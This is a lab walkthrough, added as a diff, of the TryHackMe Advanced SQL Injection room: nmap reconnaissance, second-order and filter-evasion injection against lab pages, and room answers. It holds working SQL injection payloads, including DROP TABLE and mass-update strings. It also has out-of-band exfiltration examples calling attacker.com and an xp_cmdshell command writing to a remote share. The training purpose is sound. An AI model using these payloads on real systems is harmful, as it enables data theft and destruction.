@@ -1,0 +1,888 @@
+# Advanced SQL Injection
+
+Room: [Advanced SQL Injection](https://tryhackme.com/room/advancedsqlinjection)
+
+Prerequisites:
+1. [SQL Injection](https://tryhackme.com/room/sqlinjectionlm)
+2. [SQLMAP](https://tryhackme.com/room/sqlmap)
+3. [OWASP Top 10 (2025)](https://tryhackme.com/module/owasp-top-10-2025)
+4. [Nmap](https://tryhackme.com/room/furthernmap)
+
+<img width="941" height="203" alt="image" src="https://github.com/user-attachments/assets/90622ad5-eee0-4b6e-9d6d-d698ac816e83" />
+
+## Introduction
+
+SQL injection remains one of web applications' most severe and widespread security vulnerabilities. This threat arises when an attacker exploits a web application's ability to execute arbitrary SQL queries, leading to unauthorised access to the database, data exfiltration, data manipulation, or even complete control over the application. 
+
+---
+
+### Connecting to the Machine
+
+You can start the lab machine by clicking the `Start Lab Machine` button attached to this task. You may access the VM using the AttackBox or your VPN connection.
+
+I am using my Kali Linux machine by connecting through OpenVPN Command: `sudo openvpn FILENAME`
+
+You can refer to how to connect through OpenVPN by this room: [OpenVPN](https://tryhackme.com/room/openvpn)
+
+Before diving in, it's crucial to clearly understand the lab machine's database version and operating system details. To achieve this, we can utilise Nmap, a powerful network scanning tool, to thoroughly scan the `MACHINE_IP`. This scan will provide valuable insights into the open ports, running services, and the lab machine's operating system.
+
+Firstly identifying the open ports in the Machine: `nmap MACHINE_IP`
+
+<img width="340" height="169" alt="image" src="https://github.com/user-attachments/assets/9abc6cbf-94f9-4a53-ab9d-1a8a97009745" />
+
+Now doing aggresive scan: `nmap -A -T4 -p 3306,3389,445,139,135 MACHINE_IP`
+
+```
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 12:36 -0400
+Nmap scan report for 10.48.164.234
+Host is up (0.071s latency).
+
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3306/tcp open  mysql         MariaDB 10.3.23 or earlier (unauthorized)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=SQLi
+| Not valid before: 2026-08-24T16:32:26
+|_Not valid after:  2027-02-23T16:32:26
+|_ssl-date: 2026-08-25T16:37:16+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: SQLI
+|   NetBIOS_Domain_Name: SQLI
+|   NetBIOS_Computer_Name: SQLI
+|   DNS_Domain_Name: SQLi
+|   DNS_Computer_Name: SQLi
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-08-25T16:37:08+00:00
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows 10 1709 - 22H2 (97%), Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1903 (93%), Microsoft Windows 11 24H2 - 25H2 (93%), Microsoft Windows 10 1803 (92%), Microsoft Windows Server 2012 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-08-25T16:37:10
+|_  start_date: N/A
+
+TRACEROUTE (using port 3389/tcp)
+HOP RTT      ADDRESS
+1   53.35 ms 192.168.128.1
+2   ...
+3   53.92 ms 10.48.164.234
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.68 seconds
+```
+
+`-A` means Aggresive Scan which does several advanced Nmap detection features at once:
+- OS detection: tries to identify the target's operating system.
+- Version detection: determines what software/services and their versions are running.
+- Default NSE (Nmap Scripting Engine) scripts: runs Nmap's default scripts to gather additional information.
+- Traceroute: attempts to determine the network path to the target.
+
+And then the interesting ports were selected to do further scan on them.
+
+The machine is using MySQL service on Windows.
+
+---
+
+### Answer the questions below
+
+What is the port on which MySQL service is running?
+
+3306
+
+## Quick Recap
+
+In the last SQL injection room, we explored the basics of SQL injection, understanding how attackers exploit vulnerabilities in web applications to manipulate SQL queries and access unauthorised data. We covered essential techniques, such as error-based and union-based SQL injection, and blind SQL injection methods, such as boolean-based and time-based attacks. 
+
+<img width="708" height="385" alt="image" src="https://github.com/user-attachments/assets/8380ab3d-97dc-4221-a45d-5fd909a3d608" />
+
+---
+
+### In-band SQL Injection
+
+This technique is considered the most common and straightforward type of SQL injection attack. In this technique, the attacker uses the same communication channel for both the injection and the retrieval of data. There are two primary types of in-band SQL injection:
+- **Error-Based SQL Injection**: The attacker manipulates the SQL query to produce error messages from the database. These error messages often contain information about the database structure, which can be used to exploit the database further.
+  - Example: `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`. If the database version is returned in the error message, it reveals information about the database.
+- **Union-Based SQL Injection**: The attacker uses the UNION SQL operator to combine the results of two or more SELECT statements into a single result, thereby retrieving data from other tables.
+  - Example: `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`.
+
+---
+
+### Inferential (Blind) SQL Injection
+
+Inferential SQL injection does not transfer data directly through the web application, making exploiting it more challenging. Instead, the attacker sends payloads and observes the application’s behaviour and response times to infer information about the database. There are two primary types of inferential SQL injection:
+- **Boolean-Based Blind SQL Injection**: The attacker sends an SQL query to the database, forcing the application to return a different result based on a true or false condition. By analysing the application’s response, the attacker can infer whether the payload was true or false.
+  - Example: `SELECT * FROM users WHERE id = 1 AND 1=1` (true condition) versus `SELECT * FROM users WHERE id = 1 AND 1=2` (false condition). The attacker can infer the result if the page content or behaviour changes based on the condition.
+- **Time-Based Blind SQL Injection**: The attacker sends an SQL query to the database, which delays the response for a specified time if the condition is true. By measuring the response time, the attacker can infer whether the condition is true or false.
+  - For example, `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`. If the response is delayed by 5 seconds, the attacker can infer that the condition was true.
+ 
+---
+
+### Out-of-band SQL Injection
+
+Out-of-band SQL injection is used when the attacker cannot use the same channel to launch the attack and gather results or when the server responses are unstable. This technique relies on the database server making an out-of-band request (e.g., HTTP or DNS) to send the query result to the attacker. HTTP is normally used in out-of-band SQL injection to send the query result to the attacker's server.
+
+In-band SQL Injection is easy to exploit and detect but noisy and can be easily monitored. Inferential (Blind) SQL Injection is more challenging to exploit and requires multiple requests but can be used when detailed error messages are unavailable. Out-of-band SQL Injection is less common and highly effective, requires external server control, and relies on the database’s ability to make out-of-band requests. 
+
+---
+
+### Answer the questions below
+
+1. What type of SQL injection uses the same communication channel for both the injection and data retrieval?
+
+In-band
+
+2. In out-of-band SQL injection, which protocol is usually used to send query results to the attacker's server?
+
+HTTP
+
+## Second-Order SQL Injection
+
+Second-order SQL injection, also known as stored SQL injection, exploits vulnerabilities where user-supplied input is saved and subsequently used in a different part of the application, possibly after some initial processing. This type of attack is more insidious because the malicious SQL code does not need to immediately result in a SQL syntax error or other obvious issues, making it harder to detect with standard input validation techniques. The injection occurs upon the second use of the data when it is retrieved and used in a SQL command, hence the name "Second Order".
+
+---
+
+### Impact
+
+The danger of Second-Order SQL Injection lies in its ability to bypass typical front-end defences like basic input validation or sanitisation, which only occur at the point of initial data entry. Since the payload does not cause disruption during the first step, it can be overlooked until it's too late, making the attack particularly stealthy.
+
+**Example**
+
+We will be using a book review application. The application allows users to add new books via a web page (`add.php`). Users are prompted to provide details about the book they wish to add to the database. You can access the app at `http://MACHINE_IP/second/add.php`. The data collected includes the `SSN`, `book_name`, and `author`.
+
+<img width="248" height="283" alt="image" src="https://github.com/user-attachments/assets/215d43b4-9feb-4737-9194-2a5adb81f079" />
+
+Let's consider adding a book with the following details: SSN: UI00012, Book Name: Intro to PHP, Author: Tim. This information is input through a form on the add.php page, and upon submission, it is stored in the BookStore database.
+
+As we know, Second-Order SQL injection is notably challenging to identify. Unlike traditional SQL Injection, which exploits real-time processing vulnerabilities, it occurs when data previously stored in a database is later used in a SQL query. Detecting this vulnerability often requires understanding how data flows through the application and is reused, necessitating a deep knowledge of the backend operations.
+
+**Analysis of the Code**
+
+Consider the PHP code snippet used in our application for adding books:
+
+```
+if (isset($_POST['submit'])) {
+
+    $ssn = $conn->real_escape_string($_POST['ssn']);
+
+    $book_name = $conn->real_escape_string($_POST['book_name']);
+
+    $author = $conn->real_escape_string($_POST['author']);
+
+    $sql = "INSERT INTO books (ssn, book_name, author) VALUES ('$ssn', '$book_name', '$author')";
+
+    if ($conn->query($sql) === TRUE) {
+
+        echo "<p class='text-green-500'>New book added successfully</p>";
+
+    } else {
+
+        echo "<p class='text-red-500'>Error: " . $conn->error . "</p>";
+
+    }
+
+}
+```
+
+The code uses the `real_escape_string()` method to escape special characters in the inputs. While this method can mitigate some risks of immediate SQL Injection by escaping single quotes and other SQL meta-characters, it does not secure the application against Second Order SQLi. 
+
+The key issue here is the lack of parameterised queries, which is essential for preventing SQL injection attacks. When data is inserted using the `real_escape_string()` method, it might include payload characters that don't cause immediate harm but can be activated upon subsequent retrieval and use in another SQL query. 
+
+Parameterized queries (also called prepared statements) are a method of executing database queries where the SQL command structure is strictly separated from the user-provided data parameters. Instead of dynamically building an SQL query string by concatenating strings or inserting raw user input directly, parameterized queries use placeholders (`?` or named parameters like `:ssn`) for any data values.
+
+For instance, inserting a book with a name like `Intro to PHP'; DROP TABLE books;--` might not affect the INSERT operation but could have serious implications if the book name is later used in another SQL context without proper handling.
+
+Let's try adding another book with the SSN `test'`.
+
+<img width="563" height="332" alt="image" src="https://github.com/user-attachments/assets/6c75df8c-60fe-4837-a0a4-4d8d8eedc150" />
+
+Here we go, the SSN `test'` is successfully inserted into the database. The application includes a feature to update book details through an interface like `update.ph`p. This interface might display existing book details in editable form fields, retrieved based on earlier stored data, and then update them based on user input. 
+
+The pentester would investigate whether the application reuses the data (such as `book_name`) that was previously stored and potentially tainted. Then, he would construct SQL queries for updating records using this potentially tainted data without proper sanitisation or parameterisation. By manipulating the update feature, the tester can see if the malicious payload added during the insertion phase gets executed during the update operation. If the application fails to employ proper security practices at this stage, the earlier injected payload `'; DROP TABLE books; --` could be activated, leading to the execution of a harmful SQL command like dropping a table. 
+
+You can visit the page `http://MACHINE_IP/second/update.php` to update any book details.
+
+<img width="737" height="335" alt="image" src="https://github.com/user-attachments/assets/4df1600d-4e58-4168-bd5c-24b280463553" />
+
+Now, let's review the `update.php` code. The PHP script allows users to update book details within the BookStore database. 
+
+Through the query structure, we will analyse a typical scenario where a penetration tester might look for SQL injection vulnerabilities, specifically focusing on how user inputs are handled and utilised in SQL queries. 
+
+```
+ if ( isset($_POST['update'])) {
+    $unique_id = $_POST['update'];
+    $ssn = $_POST['ssn_' . $unique_id];
+    $new_book_name = $_POST['new_book_name_' . $unique_id];
+    $new_author = $_POST['new_author_' . $unique_id];
+
+    $update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
+```
+
+The script begins by checking if the request method is POST and if the update button was pressed, indicating that a user intends to update a book's details. Following this, the script retrieves user inputs directly from the POST data:
+
+```
+     $unique_id = $_POST['update'];
+    $ssn = $_POST['ssn_' . $unique_id];
+    $new_book_name = $_POST['new_book_name_' . $unique_id];
+    $new_author = $_POST['new_author_' . $unique_id];
+```
+
+These variables (`ssn`, `new_book_name`, `new_author`) are then used to construct an SQL query for updating the specified book's details in the database:
+
+```
+ $update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
+```
+
+The script uses` multi_query` to execute multiple queries. It also inserts logs into the logs table for analytical purposes.
+
+---
+
+### Preparing the Payload
+
+We know that we can add or modify the book details based on their ssn. The normal query for updating a book might look like this:
+
+```
+ UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';
+```
+
+However, the SQL command could be manipulated if an attacker inserts a specially crafted `ssn` value. For example, if the attacker uses the `ssn` value:
+
+```
+12345'; UPDATE books SET book_name = 'Hacked'; --
+```
+
+When this value is used in the update query, it effectively ends the initial update command after `12345` and starts a new command. This would change the `book_name` of all entries in the books table to Hacked.
+
+**Let's do this**
+
+**Initial Payload Insertion**: A new book is added with the payload `12345'; UPDATE books SET book_name = 'Hacked'; --` is inserted as the `ssn`. The semicolon (`;`) will be used to terminate the current SQL statement.
+
+<img width="238" height="153" alt="image" src="https://github.com/user-attachments/assets/41911d3d-a126-4fc0-a27d-d3cc3866a7c9" />
+
+**Malicious SQL Execution**: After that, when the admin or any other user visits the URL `http://MACHINE_IP/second/update.php` and updates the book, the inserted payload breaks out of the intended SQL command structure and injects a new command that updates all records in the books table. 
+
+Let's visit the page  `http://MACHINE_IP/second/update.php` page, update the book name to anything, and click the Update button. The code will execute the following statement in the backend.
+
+```
+UPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345'; Update books set book_name ="hacked"; --'; INSERT INTO logs (page) VALUES ('update.php');
+```
+
+**Commenting Out the Rest**: The double dash (`--`) is an SQL comment symbol. Anything following `--` will be ignored by the SQL server, effectively neutralising any remaining parts of the original SQL statement that could cause errors or reveal the attack. Once the above query is executed, it will change the name of all the books to hacked, as shown below:
+
+<img width="233" height="145" alt="image" src="https://github.com/user-attachments/assets/a7f270cb-5aa2-4893-a839-2f20b3b7f153" />
+
+---
+
+### Answer the questions below
+
+1. What is the flag value after updating the title of all books to "compromised"?
+
+Updating the SQL Query for `ssn`: `12345'; UPDATE books SET book_name = 'compromised'; --`
+
+Adding this in `ssn` and adding a book:
+
+<img width="234" height="178" alt="image" src="https://github.com/user-attachments/assets/2743a0a4-f54e-4d95-b36b-84a1515df54d" />
+
+Updating the book name then we get the flag:
+
+<img width="636" height="418" alt="image" src="https://github.com/user-attachments/assets/1dffe6f7-e5cd-4340-a36c-4dd4f087dae0" />
+
+2. What is the flag value once you drop the table hello from the database?
+
+SQL Query as `ssn`: `12345'; DROP TABLE hello; --`
+
+<img width="237" height="214" alt="image" src="https://github.com/user-attachments/assets/56e40619-98a3-40a1-a20c-296d64a8b141" />
+
+Then update the book name, you get the flag:
+
+<img width="643" height="403" alt="image" src="https://github.com/user-attachments/assets/559f98a8-eee0-48c4-bd1d-67ed48023b06" />
+
+## Filter Evasion Techniques
+
+In advanced SQL injection attacks, evading filters is crucial for successfully exploiting vulnerabilities. 
+
+Statement “evading filters is crucial” it means bypassing input restrictions/security filters so that the intended SQL injection reaches and is processed by the database.
+
+Modern web applications often implement defensive measures to sanitise or block common attack patterns, making simple SQL injection attempts ineffective. As pentesters, we must adapt using more sophisticated techniques to bypass these filters.
+
+Even if a web application has strong checks that try to prevent attacks, understanding filter-evasion techniques can help an attacker find ways around those checks.
+
+---
+
+### Character Encoding
+
+Character encoding involves converting special characters in the SQL injection payload into encoded forms that may bypass input filters.
+
+**URL Encoding**: URL encoding is a common method where characters are represented using a percent (`%`) sign followed by their ASCII value in hexadecimal. 
+
+For example, the payload `' OR 1=1--` can be encoded as `%27%20OR%201%3D1--`. This encoding can help the input pass through web application filters and be decoded by the database, which might not recognise it as malicious during initial processing.
+
+**Hexadecimal Encoding**: Hexadecimal encoding is another effective technique for constructing SQL queries using hexadecimal values. 
+
+For instance, the query `SELECT * FROM users WHERE name = 'admin'` can be encoded as `SELECT * FROM users WHERE name = 0x61646d696e`. By representing characters as hexadecimal numbers, the attacker can bypass filters that do not decode these values before processing the input.
+
+**Unicode Encoding**: Unicode encoding represents characters using Unicode escape sequences. 
+
+For example, the string `admin` can be encoded as `\u0061\u0064\u006d\u0069\u006e`. This method can bypass filters that only check for specific ASCII characters, as the database will correctly process the encoded input.
+
+**Example**
+
+In this example, we explore how developers can implement basic filtering to prevent SQL injection attacks by removing specific keywords and characters from user input. However, we will also see how attackers can bypass these defences using character encoding techniques like URL encoding.
+
+You can access the page at `http://MACHINE_IP/encoding/`.
+
+<img width="353" height="104" alt="image" src="https://github.com/user-attachments/assets/fdb39db7-190b-4a41-bbcc-245b9bf96034" />
+
+Here's the PHP code (`search_books.php`) that handles the search functionality:
+
+```
+$book_name = $_GET['book_name'] ?? '';
+$special_chars = array("OR", "or", "AND", "and" , "UNION", "SELECT");
+$book_name = str_replace($special_chars, '', $book_name);
+$sql = "SELECT * FROM books WHERE book_name = '$book_name'";
+echo "<p>Generated SQL Query: $sql</p>";
+$result = $conn->query($sql) or die("Error: " . $conn->error . " (Error Code: " . $conn->errno . ")");
+if ($result->num_rows > 0) {
+    while ($row = $result->fetch_assoc()) {
+```
+
+In the above example, the developer has implemented a basic defence mechanism to prevent SQL injection attacks by removing specific SQL keywords, such as `OR`, `AND`, `UNION`, and `SELECT`. The filtering uses the `str_replace` function, which strips these keywords from the user input before they are included in the SQL query. This filtering approach aims to make it harder for attackers to inject malicious SQL commands, as these keywords are essential for many SQL injection payloads.
+
+Here's the Javascript code in the index.html page that provides the user interface for searching books:
+
+```
+function searchBooks() {
+const bookName = document.getElementById('book_name').value;
+const xhr = new XMLHttpRequest();
+xhr.open('GET', 'search_books.php?book_name=' + encodeURIComponent(bookName), true);
+   xhr.onload = function() {
+       if (this.status === 200) {
+           document.getElementById('results').innerHTML = this.responseText;
+```
+
+This `searchBooks()` function takes the book name entered by the user from the `book_name` input box, creates a request using XMLHttpRequest, and sends the book name to `search_books.php` using a GET request. `encodeURIComponent()` safely encodes the book name for use in the URL.
+
+---
+
+### Preparing the Payload
+
+Let's go through the process of preparing an SQL injection payload step-by-step, showing how URL encoding can bypass basic defences. First, let’s see what happens with a normal input that contains special characters or SQL keywords. When we search for a book named `Intro to PHP`, we get the successful result as shown below:
+
+<img width="328" height="174" alt="image" src="https://github.com/user-attachments/assets/d9b4c2a7-ef43-4f28-aa31-03a076e8074d" />
+
+But what if we try to break the query by adding special characters like `'`, `;`, etc? We will get the following output:
+
+<img width="677" height="131" alt="image" src="https://github.com/user-attachments/assets/99560687-9f20-49ae-a163-c9482e053a70" />
+
+The SQL query is not executing correctly, which probably means there is a chance of SQL Injection. 
+
+Let's try to inject the payload `'Intro to PHP' OR 1=1`. We will get the following output:
+
+<img width="641" height="142" alt="image" src="https://github.com/user-attachments/assets/54cd06d3-473e-4cc7-b9ac-b4078fd701d4" />
+
+When this input is passed to the PHP script, the `str_replace` function will strip out the `OR` keyword and the single quote, resulting in a sanitised input that will not execute the intended SQL injection. This input is ineffective because the filtering removes the critical components needed for the SQL injection to succeed.
+
+To bypass the filtering, we need to encode the input using URL encoding, which represents special characters and keywords in a way that the filter does not recognise and remove.
+
+Here is the example payload `1%27%20||%201=1%20--+`.
+- `%27` is the URL encoding for the single quote (`'`).
+- `%20` is the URL encoding for a space ( ).
+- `||` represents the SQL `OR` operator.
+- `%3D` is the URL encoding for the equals sign (`=`).
+- `%2D%2D` is the URL encoding for `--`, which starts a comment in SQL.
+
+The original (unencoded) payload is: `1' || 1=1 --+`
+
+In the above payload, `1'` closes the current string or value in the SQL query. For example, if the query is looking for a book name that matches `1`, adding `'` closes the string, making the rest of the input part of the SQL statement. `|| 1=1` part uses the SQL `OR` operator to add a condition that is always true. This condition ensures that the query returns true for all records, bypassing the original condition that was supposed to restrict the results. Similarly, `--` starts a comment in SQL, causing the database to ignore the rest of the query. This is useful to terminate any remaining part of the query that might cause syntax errors or unwanted conditions. To ensure proper spacing, `+` add a space after the comment, ensuring that the comment is properly terminated and there are no syntax issues.
+
+From the console, we can see that clicking the search button makes an AJAX call to `search_book.php`.
+
+Let's use the payload directly on the PHP page to avoid unnecessary tweaking/validation from the client.  Let's visit the URL `http://MACHINE_IP/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1` with the standard payload `Intro to PHP' OR 1=1`, and you will see an error. 
+
+<img width="762" height="83" alt="image" src="https://github.com/user-attachments/assets/0554860f-ed90-40bb-82c5-88576aa0ceef" />
+
+Now, URL encode the payload `Intro to PHP' || 1=1 --+` using [Cyber Chef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)) and try to access the URL with an updated payload. We will get the following output dumping the complete information.
+
+First URL Encode `Intro to PHP' || 1=1 --+`
+
+<img width="554" height="269" alt="image" src="https://github.com/user-attachments/assets/4803c56d-31de-4e1b-bcc5-05e1fbd52893" />
+
+Now add this string to the URL `http://MACHINE_IP/encoding/search_books.php?book_name=Intro%20to%20PHP'%20%7C%7C%201=1%20%2D%2D+`
+
+<img width="514" height="274" alt="image" src="https://github.com/user-attachments/assets/1bdfd930-066a-4a83-8b9e-d15604570be5" />
+
+The payload works because URL encoding represents the special characters and SQL keywords in a way that bypasses the filtering mechanism. When the server decodes the URL-encoded input, it restores the special characters and keywords, allowing the SQL injection to execute successfully.
+
+---
+
+### Answer the questions below
+
+1. What is the MySQL error code once an invalid query is entered with bad characters?
+
+1064
+
+2. What is the name of the book where book ID=6?
+
+Animal Series
+
+---
+
+### No-Quote SQL Injection
+
+No-Quote SQL injection techniques are used when the application filters single or double quotes or escapes.
+
+**Using Numerical Values**: One approach is to use numerical values or other data types that do not require quotes. 
+
+For example, instead of injecting `' OR '1'='1`, an attacker can use `OR 1=1` in a context where quotes are not necessary. This technique can bypass filters that specifically look for an escape or strip out quotes, allowing the injection to proceed.
+
+**Using SQL Comments**: Another method involves using SQL comments to terminate the rest of the query. 
+
+For instance, the input `admin'--` can be transformed into `admin--`, where the `--` signifies the start of a comment in SQL, effectively ignoring the remainder of the SQL statement. This can help bypass filters and prevent syntax errors.
+
+**Using CONCAT() Function**: Attackers can use SQL functions like `CONCAT()` to construct strings without quotes. 
+
+For example, `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)` constructs the string `admin`. The `CONCAT()` function and similar methods allow attackers to build strings without directly using quotes, making it harder for filters to detect and block the payload.
+
+---
+
+### No Spaces Allowed
+
+When spaces are not allowed or are filtered out, various techniques can be used to bypass this restriction.
+
+**Comments to Replace Spaces**: One common method is to use SQL comments (`/**/`) to replace spaces. 
+
+For example, instead of `SELECT * FROM users WHERE name = 'admin'`, an attacker can use `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'`. SQL comments can replace spaces in the query, allowing the payload to bypass filters that remove or block spaces.
+
+**Tab or Newline Characters**: Another approach is using tab (`\t`) or newline (`\n`) characters as substitutes for spaces. Some filters might allow these characters, enabling the attacker to construct a query like `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`. This technique can bypass filters that specifically look for spaces.
+
+**Alternate Characters**: One effective method is using alternative URL-encoded characters representing different types of whitespace, such as `%09` (horizontal tab), `%0A` (line feed), `%0C` (form feed), `%0D` (carriage return), and `%A0` (non-breaking space). These characters can replace spaces in the payload. 
+
+---
+
+### Practical Example
+
+In this scenario, we have an endpoint, `http://10.48.151.93/space/search_users.php?username=?` that returns user details based on the provided username. The developer has implemented filters to block common SQL injection keywords such as `OR`, `AND`, and spaces (`%20`) to protect against SQL injection attacks.
+
+Here is the PHP filtering added by the developer.
+
+```
+$special_chars = array(" ", "AND", "and" ,"or", "OR" , "UNION", "SELECT");
+$username = str_replace($special_chars, '', $username);
+$sql = "SELECT * FROM user WHERE username = '$username'";
+```
+
+If we use our standard payload `1%27%20||%201=1%20--+` on the endpoint, we can see that even through URL encoding, it is not working.
+
+<img width="731" height="86" alt="image" src="https://github.com/user-attachments/assets/8229c1a7-338f-42b4-aaac-5272cc1cb092" />
+
+The SQL query shows that the spaces are being omitted by code. To bypass these protections, we can use URL-encoded characters that represent different types of whitespace or line breaks, such as `%09` (horizontal tab), `%0A` (line feed). These characters can replace spaces and still be interpreted correctly by the SQL parser.
+
+The original payload `1' OR 1=1 --` can be modified to use newline characters instead of spaces, resulting in the payload `1'%0A||%0A1=1%0A--%27+`. This payload constructs the same logical condition as `1' OR 1=1 --` but uses newline characters to bypass the space filter.
+
+The SQL parser interprets the newline characters as spaces, transforming the payload into `1' OR 1=1 --`. Therefore, the query will be interpreted from `SELECT * FROM users WHERE username = '$username'` to `SELECT * FROM users WHERE username = '1' OR 1=1 --`.
+
+Now, if we access the endpoint through an updated payload, we can view all the details. 
+
+<img width="521" height="190" alt="image" src="https://github.com/user-attachments/assets/402bc84c-bda3-4489-bded-cb2c25a4f1be" />
+
+To summarise, it is important to understand that no single technique guarantees a bypass when dealing with filters or Web Application Firewalls (WAFs) designed to prevent SQL injection attacks.
+
+However, here are some tips and tricks that can be used to circumvent these protections. This table highlights various techniques that can be employed to try and bypass filters and WAFs:
+
+<img width="899" height="365" alt="image" src="https://github.com/user-attachments/assets/1744f737-92e7-48cf-bb16-818b9ad7b2bf" />
+
+---
+
+### Answer the questions below
+
+1. What is the password for the username "attacker"?
+
+tesla
+
+2. Which of the following can be used if the SELECT keyword is banned? Write the correct option only.
+
+a) SElect
+
+b) SeLect
+
+c) Both a and b
+
+d) We cannot bypass SELECT keyword filter
+
+c
+
+## Out-of-band SQL Injection
+
+Out-of-band (OOB) SQL injection is an attack technique that pentester/red teamers use to exfiltrate data or execute malicious actions when direct or traditional methods are ineffective.
+
+Exfiltrate means to secretly take or extract data from a system and send it somewhere else, usually to an attacker-controlled location.
+
+Unlike In-band SQL injection, where the attacker relies on the same channel for attack and data retrieval, Out-of-band SQL injection utilises separate channels for sending the payload and receiving the response. Out-of-band techniques leverage features like HTTP requests, DNS queries, SMB protocol, or other network protocols that the database server might have access to, enabling attackers to circumvent firewalls, intrusion detection systems, and other security measures.
+
+Circumvent firewalls means bypass the firewall's security rules or restrictions so that traffic or communication that would normally be blocked can get through.
+
+One of the key advantages of Out-of-band SQL injection is its stealth and reliability. By using different communication channels, attackers can minimise the risk of detection and maintain a persistent connection with the compromised system. 
+
+Stealth means staying hidden or avoiding detection.
+
+For instance, an attacker might inject a SQL payload that triggers the database server to make a DNS request to a malicious domain controlled by the attacker. The response can then be used to extract sensitive data without alerting security mechanisms that monitor direct database interactions. This method allows attackers to exploit vulnerabilities even in complex network environments where direct connectivity between the attacker and the target is limited or scrutinised. 
+
+---
+
+### Techniques in Different Databases
+
+Out-of-band SQL injection attacks utilise the methodology of writing to another communication channel through a crafted query. This technique is effective for exfiltrating data or performing malicious actions when direct interaction with the database is restricted. There are multiple commands within a database that may allow exfiltration, but below is a list of the most commonly used in various database systems:
+
+**MySQL and MariaDB**
+
+In MySQL or MariaDB, Out-of-band SQL injection can be achieved using `SELECT ... INTO OUTFILE` or `load_file` command. This command allows an attacker to write the results of a query to a file on the server's filesystem. For example:
+
+```
+SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
+```
+
+An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.
+
+**Microsoft SQL Server (MSSQL)**
+
+In MSSQL, Out-of-band SQL injection can be performed using features like `xp_cmdshell`, which allows the execution of shell commands directly from SQL queries. This can be leveraged to write data to a file accessible via a network share:
+
+```
+EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
+```
+
+Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration through OOB channels.
+
+**Oracle**
+
+In Oracle databases, Out-of-band SQL injection can be executed using the `UTL_HTTP` or `UTL_FILE` packages. For instance, the `UTL_HTTP` package can be used to send HTTP requests with sensitive data:
+
+```
+DECLARE
+  req UTL_HTTP.REQ;
+  resp UTL_HTTP.RESP;
+BEGIN
+  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
+  UTL_HTTP.GET_RESPONSE(req);
+END;
+```
+
+---
+
+### Examples of Out-of-band Techniques
+
+Out-of-band SQL injection techniques in MySQL and MariaDB can utilise various network protocols to exfiltrate data. The primary methods include DNS exfiltration, HTTP requests, and SMB shares. Each of these techniques can be applied depending on the capabilities of the MySQL/MariaDB environment and the network setup.
+
+**HTTP Requests**
+
+By leveraging database functions that allow HTTP requests, attackers can send sensitive data directly to a web server they control. This method exploits database functionalities that can make outbound HTTP connections. Although MySQL and MariaDB do not natively support HTTP requests, this can be done through external scripts or User Defined Functions (UDFs) if the database is configured to allow such operations.
+
+First, the UDF needs to be created and installed to support HTTP requests. This setup is complex and usually involves additional configuration. An example query would look like `SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`.
+
+HTTP request exfiltration can be implemented on Windows and Linux (Ubuntu) systems, depending on the database's support for external scripts or UDFs that enable HTTP requests.
+
+**DNS Exfiltration**
+
+Attackers can use SQL queries to generate DNS requests with encoded data, which is sent to a malicious DNS server controlled by the attacker. This technique bypasses HTTP-based monitoring systems and leverages the database's ability to perform DNS lookups.
+
+As discussed above, MySQL does not natively support generating DNS requests through SQL commands alone, attackers might use other means such as custom User-Defined Functions (UDFs) or system-level scripts to perform DNS lookups.
+
+Windows supports SMB/UNC paths directly, so they can be used without much extra setup. Linux, such as Ubuntu, does not support Windows-style UNC paths directly, but you can still access SMB shared folders using tools like smbclient or by mounting the share to a local folder. Using UNC paths directly in SQL queries on Linux may require some extra setup or scripts.
+
+UNC stands for Universal Naming Convention. It is a standard way to specify the location of a shared file or folder on a network, especially in Windows.
+
+---
+
+### Practical Example
+
+In this practical scenario, we will demonstrate how an attacker can exfiltrate data from a vulnerable web application using an Out-of-band SQL injection technique. The server-side code contains an SQL injection vulnerability that allows an attacker to craft a payload that writes the results of a query to an external SMB share. This is useful when direct responses from the database are restricted or monitored.
+
+**Scenario Explanation**
+
